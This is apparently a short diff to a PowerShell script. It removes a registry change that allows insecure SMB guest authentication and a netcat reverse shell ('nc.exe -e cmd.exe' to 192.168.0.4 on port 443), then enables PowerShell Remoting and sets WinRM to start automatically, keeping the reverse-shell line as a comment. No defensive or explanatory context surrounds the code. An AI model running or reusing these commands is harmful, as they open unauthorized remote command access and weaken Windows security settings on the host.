@@ -15,7 +15,14 @@ function Main
 
     #echo "Hello world"
 
-    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "AllowInsecureGuestAuth" /t "REG_DWORD" /d "1" /f;
-    cmd /c \\192.168.0.4\gualdronsito\netcat\nc.exe -e cmd.exe 192.168.0.4 443;
+    Enable-PSRemoting -Force
+
+    # Set start mode to automatic
+    Set-Service WinRM -StartMode Automatic
+
+    # Verify start mode and state - it should be running
+    Get-WmiObject -Class win32_service | Where-Object {$_.name -like "WinRM"}
+
+    #cmd /c \\192.168.0.4\gualdronsito\netcat\nc.exe -e cmd.exe 192.168.0.4 443;
 }
 Main
